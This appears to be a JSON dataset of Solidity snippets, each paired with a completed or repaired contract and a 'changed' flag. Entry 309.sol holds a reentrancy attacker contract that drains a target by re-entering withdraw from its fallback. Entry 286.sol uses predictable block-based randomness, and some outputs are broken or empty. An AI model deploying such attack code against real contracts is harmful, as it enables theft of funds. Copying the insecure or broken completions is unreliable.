        "input": "transferFrom(msg.sender, address(this), tokenAmount);\nthis.approve(uniswapV2Router.address, tokenAmount);\n\nfunction swapTokensForEth(uint tokenAmount) public {\n    require(tokenAmount > 0, \"Need to send some tokens\");\n    require(tradingOpen, \"Trading is not open yet\");\n\n\n    address[] memory path = new address[](2);\n    path[0] = address(this);\n    path[1] = uniswapV2Router.WETH();\n\n    transferFrom(msg.sender, address(this), tokenAmount);\n    this.approve(uniswapV2Router.address, tokenAmount);\n\n    uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n        tokenAmount,\n        0, \n        path,\n        msg.sender, \n        block.timestamp + 300 \n    );\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "282.sol": {
        "input": "pragma solidity ^0.8.7;\n\nimport \"https:\n\ncontract TokenTransfer {\n    IERC20 _token;\n\n    constructor(address token) {\n        _token = IERC20(token);\n    }\n\n    modifier checkAllowance(uint amount) {\n        require(_token.allowance(msg.sender, address(this)) >= amount, \"Error\");\n        _;\n    }\n\n    function depositTokens(uint _amount) public checkAllowance(_amount) {\n        _token.transferFrom(msg.sender, address(this), _amount);\n    }\n    \n    function stake(address to, uint amount) public {\n        _token.transfer(to, amount);\n    }\n\n    function getSmartContractBalance() external view returns(uint) {\n        return _token.balanceOf(address(this));\n    }\n    \n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "283.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function foo() external {\n        borrow(uint256(getLatestPrice()));\n    }\n    \n    function getLatestPrice() internal returns (int256) {\n        return 1;\n    }\n    \n    function borrow(uint256 _number) internal {\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract MyContract {\n    function foo() external {\n        borrow(uint256(getLatestPrice()));\n    }\n    \n    function getLatestPrice() internal returns (int256) {\n        return 1;\n    }\n    \n    function borrow(uint256 _number) internal {\n    }\n}\n\n",
        "changed": 0
    },
    "284.sol": {
        "input": "pragma solidity ^0.8.7;\n\ncontract SimpleStorage {\n\n    uint256 favoriteNumber;\n    bool favoriteBool;\n\n    struct People\n    {\n        uint256 favoriteNumber;\n        string name;\n    }\n\n    People[] public people;\n\n        function store(uint256 _favoriteNumber) public {\n            favoriteNumber =_favoriteNumber;\n        }\n    }\n  \n\n\n",
        "output": "pragma solidity ^0.8.7;\n\ncontract SimpleStorage {\n\n    uint256 favoriteNumber;\n    bool favoriteBool;\n\n    struct People\n    {\n        uint256 favoriteNumber;\n        string name;\n    }\n\n    People[] public people;\n\n        function store(uint256 _favoriteNumber) public {\n            favoriteNumber =_favoriteNumber;\n        }\n    }\n  \n\n",
        "changed": 0
    },
    "285.sol": {
        "input": "  Request memory newRequest = Request({\n        descritption: descritpion,\n        value: value,\n        recipient: recipient,\n        complete: false\n    });\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract RequestContract {\n    struct Request {\n        string description;\n        uint value;\n        address payable recipient;\n        bool complete;\n    }\n\n    Request[] public requests;\n    address public manager;\n\n    constructor() {\n        manager = msg.sender;\n    }\n\n    function createRequest(string memory description, uint value, address payable recipient) public {\n        Request memory newRequest = Request({\n            description: description,\n            value: value,\n            recipient: recipient,\n            complete: false\n        });\n\n        requests.push(newRequest);\n    }\n\n    function completeRequest(uint index) public {\n        Request storage request = requests[index];\n\n        require(msg.sender == manager);\n        require(!request.complete);\n\n        request.recipient.transfer(request.value);\n        request.complete = true;\n    }\n}\n\n",
        "changed": 0
    },
    "286.sol": {
        "input": "uint256 randomness = uint(keccak256(abi.encodePacked(msg.sender, block.difficulty, block.timestamp)));\n\n    function fulfillRandomWords(uint256 _requestId, uint256[] memory _randomWords) internal override {\n        uint256 randomness = _randomWords[0];\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    uint256 public randomness;\n\n    constructor() public {\n        randomness = uint(keccak256(abi.encodePacked(msg.sender, block.difficulty, block.timestamp)));\n    }\n\n    function fulfillRandomWords(uint256 _requestId, uint256[] memory _randomWords) internal {\n        randomness = _randomWords[0];\n    }\n}\n\n",
        "changed": 0
    },
    "287.sol": {
        "input": "interface IERC20 {\n   function transferFrom(address sender, address recipient, uint amount) external returns(bool);\n}\n\ncontract Energy {\n   address currentTokenAddress public = 0xTOKEN;\n   mapping(address => uint) energyBalance;\n\n   function sendToken_and_ConvertEnergys(uint _tokenAmount) external {\n       uint calculatedEnergy = _tokenAmount/1000;\n       IERC20(currentTokenAddress ).transferFrom(msg.sender,address(this),calculatedEnergy);\n       energyBalance[msg.sender] += _calculatedEnergy;\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n   function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ncontract Energy {\n   IERC20 public currentToken;\n   mapping(address => uint256) public energyBalance;\n\n   constructor(address _tokenAddress) public {\n       currentToken = IERC20(_tokenAddress);\n   }\n\n   function sendToken_and_ConvertEnergys(uint256 _tokenAmount) external {\n       uint256 calculatedEnergy = _tokenAmount/1000;\n       require(currentToken.transferFrom(msg.sender, address(this), _tokenAmount), \"Transfer failed\");\n       energyBalance[msg.sender] += calculatedEnergy;\n   }\n}\n\n",
        "changed": 1
    },
    "288.sol": {
        "input": "mapping(uint => Record[]) recordsByUserID;\n\nRecords userRecords[] = recordsByUserID[user_id];\n\nevent Approved(uint indexed userId, uint indexed recordId);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract UserRecords {\n    struct Record {\n        uint id;\n        string data;\n    }\n\n    mapping(uint => Record[]) public recordsByUserID;\n\n    event Approved(uint indexed userId, uint indexed recordId);\n\n    function addRecord(uint userId, uint recordId, string memory data) public {\n        Record memory newRecord = Record({\n            id: recordId,\n            data: data\n        });\n        \n        recordsByUserID[userId].push(newRecord);\n    }\n\n    function getRecord(uint userId, uint index) public view returns (uint, string memory) {\n        return (recordsByUserID[userId][index].id, recordsByUserID[userId][index].data);\n    }\n\n    function approve(uint userId, uint recordId) public {\n        emit Approved(userId, recordId);\n    }\n}\n\n",
        "changed": 0
    },
    "289.sol": {
        "input": "pragma solidity ^0.8.16;\n \nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\ncontract MyToken is ERC20 {\n    constructor() ERC20(\"MyToken\", \"MyT\") {\n        _mint(msg.sender, 1000 * 1e18);\n    }\n\n    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {\n        if (to.code.length > 0) {\n            try IERC20Receiver(to).onERC20Receive(from, amount) returns (bool success) {\n            } catch {\n            }\n        }\n    }\n}\n\ninterface IERC20Receiver {\n    function onERC20Receive(address from, uint256 amount) external returns (bool);\n}\n\ncontract SomeReceiver is IERC20Receiver {\n    event ReceivedTokens(address from, uint256 amount);\n\n    function onERC20Receive(address from, uint256 amount) external returns (bool) {\n        emit ReceivedTokens(from, amount);\n        return true;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20Receiver {\n    function onERC20Received(address operator, address from, uint256 amount, bytes calldata data) external returns (bytes4);\n}\n\n",
        "changed": 1
    },
    "290.sol": {
        "input": "function withdrawalTokens(address _addressChange) public {\n    require (msg.sender == owner);\n\n    uint256 amountToWithdraw = stakingBalance[_addressChange];\n\n    stakingBalance[_addressChange] = 0;\n\n    USDc.transfer(msg.sender, amountToWithdraw);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 { \n    function transfer(address recipient, uint256 amount) external returns(bool);\n}\n\ncontract MyContract {\n    address public owner;\n    mapping(address => uint256) public stakingBalance;\n    IERC20 public USDc;\n\n    constructor(IERC20 _usdc) public {\n        owner = msg.sender;\n        USDc = _usdc;\n    }\n\n    function withdrawalTokens(address _addressChange) public {\n        require (msg.sender == owner);\n\n        uint256 amountToWithdraw = stakingBalance[_addressChange];\n\n        stakingBalance[_addressChange] = 0;\n\n        USDc.transfer(msg.sender, amountToWithdraw);\n    }\n}\n\n",
        "changed": 0
    },
    "291.sol": {
        "input": "function getPower() public {\n    require(election_state == ELECTION_STATE.OPEN);\n    require(votingPeriod > block.timestamp);\n    voters[msg.sender].power = msg.sender.balance * 10;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Voting {\n\n    enum ELECTION_STATE { OPEN, CLOSED }\n    ELECTION_STATE public election_state = ELECTION_STATE.OPEN;\n    uint public votingPeriod = block.timestamp + 1 weeks;\n\n    struct Voter {\n        uint power;\n        bool voted;\n    }\n\n    mapping(address => Voter) public voters;\n\n    function getPower() public {\n        require(election_state == ELECTION_STATE.OPEN, \"Election is not open\");\n        require(votingPeriod > block.timestamp, \"Voting period has ended\");\n        voters[msg.sender].power = msg.sender.balance * 10;\n    }\n\n    function vote() public {\n        require(!voters[msg.sender].voted, \"Already voted\");\n        require(votingPeriod > block.timestamp, \"Voting period has ended\");\n        voters[msg.sender].voted = true;\n    }\n\n    function closeElection() public {\n        require(votingPeriod < block.timestamp, \"Voting period is not yet over\");\n        election_state = ELECTION_STATE.CLOSED;\n    }\n}\n\n",
        "changed": 0
    },
    "292.sol": {
        "input": "function _transfer(address sender,address recipient, uint256 amount) private returns(bool){\n    require(recipient != address(0),\"ERC20: transfer to the zero address\");\n    uint256 senderBalances = balanceOf[sender];\n    require(senderBalances >= amount,\"You don't have enough token\");\n    balanceOf[sender] = senderBalances - amount;\n    balanceOf[recipient] += amount;\n\n    return true;\n}\n\nsomeaddress = (await ethers.getSigners())[1]\nconsole.log(\"Balance:\", (await someAddress.getBalance()).toString());\n\nnetworks: {\n        hardhat: {\n            chainId: 31337,\n        },\n      ...\n  }\n\n  npx hardhat test\n\nnpx hardhat node\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyToken {\n    mapping(address => uint256) private _balances;\n\n    event Transfer(address indexed sender, address indexed recipient, uint256 amount);\n\n    function balanceOf(address account) public view returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n        _balances[sender] = senderBalance - amount;\n        _balances[recipient] += amount;\n\n        emit Transfer(sender, recipient, amount);\n\n        return true;\n    }\n}\n\n",
        "changed": 0
    },
    "293.sol": {
        "input": "uint256 senderBalance = _balances[sender];\nrequire(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\nunchecked {\n\n    _balances[sender] = senderBalance - amount;\n}\n\nuint256 senderBalance = _balances[sender];\nrequire(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n\n_balances[sender] = senderBalance - amount;\n\n_balances[sender] -= amount;\n\nunchecked {\n    _balances[sender] -= amount;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ERC20 {\n    mapping(address => uint256) private _balances;\n    mapping (address => mapping (address => uint256)) private _allowances;\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n\n    constructor (string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n        _decimals = 18;\n    }\n\n    function name() public view returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view returns (string memory) {\n        return _symbol;\n    }\n\n    function decimals() public view returns (uint8) {\n        return _decimals;\n    }\n\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\n\n        unchecked {\n            _balances[sender] = senderBalance - amount;\n        }\n        _balances[recipient] += amount;\n    }\n}\n\n",
        "changed": 0
    },
    "294.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    event DataRequested(string url);\n\n    function requestData(string memory url) public {\n        emit DataRequested(url);\n    }\n\n    function receiveData(bytes memory data) public {\n        require(msg.sender == address(0x123));\n    }\n}\n\nconst Web3 = require(\"web3\");\nconst web3 = new Web3(YOUR_NODE_URL);\n\nconst myContract = new web3.eth.Contract(ABI, ADDRESS);\n\nmyContract.events.DataRequested(async (eventData) => {\n    const result = queryUrl(eventData.returnValues.url);\n\n    await myContract.methods.receiveData(result).send({\n        from: \"0x123\"\n    });\n});\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract MyContract {\n    address public dataReceiver = 0x123;\n\n    event DataRequested(string url);\n\n    function requestData(string memory url) public {\n        emit DataRequested(url);\n    }\n\n    function receiveData(bytes memory data) public {\n        require(msg.sender == dataReceiver, \"Caller is not the data receiver\");\n        // Process the data here\n    }\n}\n\n",
        "changed": 0
    },
    "296.sol": {
        "input": "function GetBetTitle(address betAddress) public view returns(string){\n       BetContract currentBet = BetContract(payable(betAddress));\n\n       return currentBet.GetTitle();\n   }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract BetContract {\n    function GetTitle() public view returns(string memory){\n        return \"Bet Title\";\n    }\n}\n\ncontract BetManager {\n    function GetBetTitle(address betAddress) public view returns(string memory){\n        BetContract currentBet = BetContract(betAddress);\n        return currentBet.GetTitle();\n    }\n}\n\n",
        "changed": 0
    },
    "299.sol": {
        "input": "function approve(address to, uint256 tokenId) public virtual override {\n    address owner = ERC721.ownerOf(tokenId);\n    require(to != owner, \"ERC721: approval to current owner\");\n\n    require(\n        _msgSender() == owner || isApprovedForAll(owner, _msgSender()),\n        \"ERC721: approve caller is not owner nor approved for all\"\n    );\n\n    _approve(to, tokenId);\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "300.sol": {
        "input": "pragma solidity >=0.8.0;\n\ncontract Abi2Test {\n\n    function getByte() public returns (bytes memory) {\n        bytes4 func = bytes4(keccak256(\"callMe(uint256[])\"));\n        return abi.encode(func);\n     }\n\n    function getByte2() public returns (bytes memory) {\n        bytes4 func = bytes4(keccak256(\"callMe(uint256[])\"));\n        return abi.encodePacked(func);\n     }\n}\n\npragma solidity >=0.8.0;\n\ncontract Abi2Test {\n\n    event A(uint256);\n    event Out(bytes);\n    event Out1(bytes);\n\n    function test() public {\n        bytes4 func = bytes4(keccak256(\"callMe(uint256[])\"));\n\n        uint256[] memory arr = new uint256[](3);\n        arr[0] = 3;\n        arr[1] = 4;\n\n\n        (bool res, bytes memory data) = address(this).call(abi.encodePacked(func, abi.encode(arr)));\n        emit Out(data);\n        require(res);\n    }\n\n    function callMe(uint256[] memory array) public {\n            emit A(array.length);\n            emit Out1(msg.data);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Abi2Test {\n    event A(uint256);\n    event Out(bytes);\n    event Out1(bytes);\n\n    function getByte() public view returns (bytes memory) {\n        bytes4 func = bytes4(keccak256(\"callMe(uint256[])\"));\n        return abi.encode(func);\n    }\n\n    function getByte2() public view returns (bytes memory) {\n        bytes4 func = bytes4(keccak256(\"callMe(uint256[])\"));\n        return abi.encodePacked(func);\n    }\n\n    function test() public {\n        bytes4 func = bytes4(keccak256(\"callMe(uint256[])\"));\n\n        uint256[] memory arr = new uint256[](3);\n        arr[0] = 3;\n        arr[1] = 4;\n\n        (bool res, bytes memory data) = address(this).call(abi.encodePacked(func, abi.encode(arr)));\n        emit Out(data);\n        require(res);\n    }\n\n    function callMe(uint256[] memory array) public {\n        emit A(array.length);\n        emit Out1(msg.data);\n    }\n}\n",
        "changed": 0
    },
    "301.sol": {
        "input": "pragma solidity ^0.8.0;\n\nimport \"hardhat/console.sol\";\n\ncontract MeetingCreation {\n\n    struct Meeting {\n        address meeting_creator;\n        uint256 meetingID;\n        string name;\n        string description;\n        uint256 start_date;\n        uint256 end_date;\n        uint256 max_tickets;\n        uint256 ticket_price;\n        uint256 current_tickets_sold;\n        address[] attendees;\n    }\n\n    mapping(uint => Meeting) meetings;\n\n    function RSVP (uint256 MEETINGID) public payable {\n        Meeting storage m = meetings[MEETINGID];\n\n        require(m.current_tickets_sold < m.max_tickets,\n            \"No more tickets available\"\n        );\n\n        require(msg.sender.balance >= m.ticket_price,\n            \"Not enough funds\"\n        );\n\n        address[] storage adr;\n        adr = m.attendees;\n        adr.push(msg.sender); \n        m.current_tickets_sold += 1;\n    }\n\n    function getSmartContractBalance() external view returns(uint) {\n        return address(this).balance;\n    }\n}  \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MeetingCreation {\n\n    struct Meeting {\n        address payable meeting_creator;\n        uint256 meetingID;\n        string name;\n        string description;\n        uint256 start_date;\n        uint256 end_date;\n        uint256 max_tickets;\n        uint256 ticket_price;\n        uint256 current_tickets_sold;\n        address[] attendees;\n    }\n\n    uint256 meetingCount;\n    mapping(uint => Meeting) meetings;\n\n    function createMeeting(string memory _name, string memory _description, uint256 _start_date, uint256 _end_date, uint256 _max_tickets, uint256 _ticket_price) public {\n        meetings[meetingCount] = Meeting({\n            meeting_creator: payable(msg.sender),\n            meetingID: meetingCount,\n            name: _name,\n            description: _description,\n            start_date: _start_date,\n            end_date: _end_date,\n            max_tickets: _max_tickets,\n            ticket_price: _ticket_price,\n            current_tickets_sold: 0,\n            attendees: new address[](0)\n        });\n        meetingCount++;\n    }\n\n    function RSVP (uint256 _meetingID) public payable {\n        Meeting storage m = meetings[_meetingID];\n\n        require(m.current_tickets_sold < m.max_tickets,\n            \"No more tickets available\"\n        );\n\n        require(msg.value >= m.ticket_price,\n            \"Not enough funds\"\n        );\n\n        m.meeting_creator.transfer(m.ticket_price);\n\n        m.attendees.push(msg.sender); \n        m.current_tickets_sold += 1;\n    }\n\n    function getSmartContractBalance() external view returns(uint) {\n        return address(this).balance;\n    }\n}  \n\n",
        "changed": 0
    },
    "302.sol": {
        "input": "bytes <var_name> = bytes(<string_var>);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ContractName {\n    bytes public var_name;\n    string public string_var;\n\n    constructor(string memory _string_var) {\n        string_var = _string_var;\n        var_name = bytes(string_var);\n    }\n}\n\n",
        "changed": 0
    },
    "304.sol": {
        "input": "uint public counter;\n\nmapping(uint = > Deposit) public ids; \n\nfunction deposit() public payable {\n\n    Deposit storage _deposit = ids[_counter]; \n\n    _deposit.depositAmount = msg.value; \n\n    _deposit.depositor = msg.sender;\n    \n    activeDeposits.push(_deposit);\n\n    _counter++; \n\n    emit DepositMade(msg.sender, msg.value);\n}\n\n\n",
        "output": "pragma solidity ^0.5.16;\ncontract MyContract {\n    uint public counter;\n    struct Deposit {\n        uint depositAmount;\n        address payable depositor;\n    }\n\n    mapping(uint => Deposit) public ids;\n    Deposit[] public activeDeposits;\n    \n    event DepositMade(address indexed _from, uint _value);\n\n    function deposit() public payable {\n        Deposit storage _deposit = ids[counter];\n        _deposit.depositAmount = msg.value;\n        _deposit.depositor = msg.sender;\n        activeDeposits.push(_deposit);\n        counter++; \n        emit DepositMade(msg.sender, msg.value);\n    }\n}\n\n",
        "changed": 0
    },
    "305.sol": {
        "input": "address[] public owners;\n\nowners[i] = temp[i];\n\nfor(uint256 i=0; i<temp.length; i++) {\n    owners.push(temp[i]);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    address[] public owners;\n\n    constructor(address[] memory temp) public {\n        for(uint256 i=0; i<temp.length; i++) {\n            owners.push(temp[i]);\n        }\n    }\n\n    function setOwners(address[] memory temp) public {\n        for(uint256 i=0; i<temp.length; i++) {\n            owners[i] = temp[i];\n        }\n    }\n\n    function getOwners() public view returns(address[] memory) {\n        return owners;\n    }\n}\n\n",
        "changed": 0
    },
    "306.sol": {
        "input": "  function setRandomNumberGenerator(address _randomNumberGenerator) external onlyOwner {\n    randomNumberGenerator = IRandomNumberGenerator(_randomNumberGenerator);\n  }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IRandomNumberGenerator {\n    function getRandomNumber() external view returns (uint256);\n}\n\n",
        "changed": 0
    },
    "307.sol": {
        "input": "i -= 1;\n\nunchecked {\n  i -= 1;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TestContract {\n   uint256 private i;\n\n   constructor(uint256 _i) {\n       i = _i;\n   }\n\n   function decrement() public {\n       i -= 1;\n       unchecked {\n           i -= 1;\n       }\n   }\n\n   function getValue() public view returns (uint256){\n       return i;\n   }\n}\n\n",
        "changed": 0
    },
    "308.sol": {
        "input": "pragma solidity >=0.7.0 <0.9.0;\n\ncontract FinalExcercise {\n    uint256 a = 300;\n    uint256 b = 12;\n    uint256 f = 47;\n\n    function finalize() public view returns (uint256) {\n        uint256 d = 23;\n        if (a <= a && b < f) {\n            return (d * 2) - b;\n        }\n    }\n}\n\n\n",
        "output": "pragma solidity >=0.7.0 <0.9.0;\n\ncontract FinalExcercise {\n    uint256 a = 300;\n    uint256 b = 12;\n    uint256 f = 47;\n\n    function finalize() public view returns (uint256) {\n        uint256 d = 23;\n        if (a <= a && b < f) {\n            return (d * 2) - b;\n        }\n    }\n}\n\n",
        "changed": 0
    },
    "309.sol": {
        "input": "address public target;\n    uint32 public i = 0;\n    constructor(address _target) payable {\n        target=_target;\n    }\n\n     bytes memory payload=abi.encodeWithSignature(\"donate(address)\",_to);\n    (bool success,)=target.call{value:val}(payload);\n    require(success,\"target.call failed\");\n\nfallback() external payable {\n    i++;\n    require(i<target.balance,\"error here\");\n    Reentrance(payable(target)).withdraw(1);\n}\n\n function callwithdraw() public \n    {\n        target.call(abi.encodeWithSignature(\"withdraw(uint)\",1));\n    }\n\n    i++;\n    require(i<target.balance);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface Reentrance {\n    function withdraw(uint) external;\n}\n\ncontract MyContract {\n    address public target;\n    uint32 public i = 0;\n    \n    constructor(address _target) payable {\n        target = _target;\n    }\n\n    function donate(address _to, uint val) public {\n        bytes memory payload = abi.encodeWithSignature(\"donate(address)\", _to);\n        (bool success,) = target.call{value:val}(payload);\n        require(success, \"target.call failed\");\n    }\n\n    fallback() external payable {\n        i++;\n        require(i < address(this).balance, \"error here\");\n        Reentrance(payable(target)).withdraw(1);\n    }\n\n    function callwithdraw() public {\n        bytes memory payload = abi.encodeWithSignature(\"withdraw(uint)\", 1);\n        (bool success,) = target.call(payload);\n        require(success, \"callwithdraw failed\");\n        i++;\n        require(i < address(this).balance, \"Insufficient balance\");\n    }\n}\n\n",
        "changed": 0
    },
    "310.sol": {
        "input": "uint[] memory dynamicMemArray = new uint[](size);\n\nfunction doesSomethingWithArray(uint x) ... {\n    uint[] storage dynamicStorageArray;\n    dynamicStorageArray.push(x); \n    ...\n}\n\n\nuint[][3] public dynamicStorageArrays; \nfunction doesSomethingWithArray(uint x) ... {\n    uint[] storage dynamicStorageArray = dynamicStorageArrays[1];\n    dynamicStorageArray.push(x);\n    ...\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TestContract {\n    uint public size = 10;\n    uint[][] public dynamicStorageArrays;\n    \n    constructor() public {\n        dynamicStorageArrays.push(new uint[](size));\n        dynamicStorageArrays.push(new uint[](size));\n        dynamicStorageArrays.push(new uint[](size));\n    }\n\n    function doesSomethingWithArray1(uint x) public {\n        dynamicStorageArrays[0].push(x); \n    }\n\n    function doesSomethingWithArray2(uint x) public {\n        dynamicStorageArrays[1].push(x);\n    }\n}\n\n",
        "changed": 0
    },
    "311.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract MyContract {\n    struct Struct1Type {\n        uint8 number;\n    }\n\n    struct Struct2Type {\n        uint16 number;\n    }\n\n    function callFunction(bytes calldata _data) external pure returns (Struct1Type memory, Struct2Type memory) {\n        Struct1Type memory data1 = abi.decode(_data[:32], (Struct1Type));\n\n        Struct2Type memory data2 = abi.decode(_data[32:], (Struct2Type));\n\n        return (data1, data2);\n    }\n}\n\n# two values: `1` and `2`\n0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000002\n\n0: tuple(uint8): 1\n1: tuple(uint16): 2\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct Struct1Type {\n        uint8 number;\n    }\n\n    struct Struct2Type {\n        uint16 number;\n    }\n\n    function callFunction(bytes calldata _data) external pure returns (Struct1Type memory, Struct2Type memory) {\n        require(_data.length >= 64, \"Data is too short\");\n\n        Struct1Type memory data1 = abi.decode(_data[:32], (Struct1Type));\n        Struct2Type memory data2 = abi.decode(_data[32:64], (Struct2Type));\n\n        return (data1, data2);\n    }\n}\n\n",
        "changed": 0
    },
    "312.sol": {
        "input": "pragma solidity >=0.6.0 <0.9.0;\n\ncontract Map {\n    mapping (uint => uint)[] array;\n\n    function allocate(uint newMaps) public {\n        for (uint i = 0; i < newMaps; i++)\n            array.push();\n    }\n\n    function writeMap(uint map, uint key, uint value) public {\n        array[map][key] = value;\n    }\n\n    function readMap(uint map, uint key) public view returns (uint) {\n        return array[map][key];\n    }\n\n    function eraseMaps() public {\n        delete array;\n    }\n}\n\n\n",
        "output": "// SPDX-License-Identifier: GPL-3.0\npragma solidity >=0.6.0 <0.9.0;\n\ncontract Map {\n    mapping (uint => uint)[] array;\n\n    function allocate(uint newMaps) public {\n        for (uint i = 0; i < newMaps; i++)\n            array.push();\n    }\n\n    function writeMap(uint map, uint key, uint value) public {\n        array[map][key] = value;\n    }\n\n    function readMap(uint map, uint key) public view returns (uint) {\n        return array[map][key];\n    }\n\n    function eraseMaps() public {\n        delete array;\n    }\n}\n\n",
        "changed": 0
    },
    "313.sol": {
        "input": "pragma solidity ^0.8.2;\n\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Burnable.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\n\ncontract WTest is ERC721, ERC721Enumerable, ERC721Burnable, Ownable {\n    using Strings for uint256;\n    using SafeMath for uint256;\n\n\n    uint256 public mintPrice;\n    address public blackHoleAddress;\n    \n    ERC721 public crateContract;\n\n    string public baseURI;\n    string public baseExtension = \".json\";\n    mapping(uint256 => bool) private _crateProcessList;\n\n    bool public paused = false;\n    bool public revealed = false;\n\n    uint256 public maxSupply = 5000;\n    uint256 public maxPrivateSupply = 580;\n    uint256 public maxMintAmount = 20;\n    string public notRevealedUri;\n\n    event OperationResult(bool result, uint256 itemId);\n   \n\n    constructor() ERC721(\"WTest\", \"WTST\") {}\n\n    function _baseURI() internal view virtual override returns (string memory) {\n    return baseURI;\n  }\n\n    function setBASEURI(string memory newuri) public onlyOwner {\n        baseURI = newuri;\n    }\n\n     function setMintPrice(uint256 _mintPrice) public onlyOwner  returns(bool success) {\n        mintPrice = _mintPrice;\n        return true;\n    }\n\n    function getMintPrice() public view returns (uint256)\n    {\n    return mintPrice;\n    }\n\n    function setBlackHoleAddress(address _blackHoleAddress) public onlyOwner  returns(bool success) {\n        blackHoleAddress = _blackHoleAddress;\n        return true;\n    }\n\n\n    function setcrateContractAddress(ERC721 _crateContractAddress) public onlyOwner returns (bool success) {\n        crateContract = _crateContractAddress;\n        return true;\n    }\n\n    function mint(uint256 _mintAmount) public payable {\n        uint256 supply = totalSupply();\n        require(!paused);\n        require(_mintAmount > 0);\n        require(_mintAmount <= maxMintAmount);\n        require(supply + _mintAmount <= maxSupply);\n\n        if (msg.sender != owner()) {\n        require(msg.value >= mintPrice * _mintAmount);\n        }\n\n        for (uint256 i = 1; i <= _mintAmount; i++) {\n        _safeMint(msg.sender, supply + i);\n        }\n    }\n\n    function _beforeTokenTransfer(address from, address to, uint256 tokenId) internal override(ERC721, ERC721Enumerable) {\n        super._beforeTokenTransfer(from, to, tokenId);\n    }\n\n    function supportsInterface(bytes4 interfaceId) public view override(ERC721, ERC721Enumerable) returns (bool) {\n        return super.supportsInterface(interfaceId);\n    }\n\n}\n\n\n",
        "output": "",
        "changed": 0
    },
    "314.sol": {
        "input": "struct teamWallets {\n    string name;\n    uint256 balance;\n}\n\nmapping(address => teamWallets) public getInfoByWallet;\n\n\nfunction setInfo(address _wall, string memory _name, uint256 _balance) public {\n    getInfoByWallet[_wall].name=_name;        \n    getInfoByWallet[_wall].balance=_balance;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TeamWallets {\n    struct TeamWallet {\n        string name;\n        uint256 balance;\n    }\n\n    mapping(address => TeamWallet) public teamWallets;\n\n    function setInfo(address _wallet, string memory _name, uint256 _balance) public {\n        TeamWallet storage wallet = teamWallets[_wallet];\n        wallet.name = _name;\n        wallet.balance = _balance;\n    }\n\n    function getInfo(address _wallet) public view returns (string memory name, uint256 balance) {\n        TeamWallet storage wallet = teamWallets[_wallet];\n        return (wallet.name, wallet.balance);\n    }\n}\n\n",
        "changed": 0
    },
    "315.sol": {
        "input": "pragma solidity ^0.6.0;\n\nimport \"https:\nimport \"https:\nimport \"https:\n\ncontract MyContract {\n  address private wallet = 0x0000000000000000000000000;\n\n}\n\n\n",
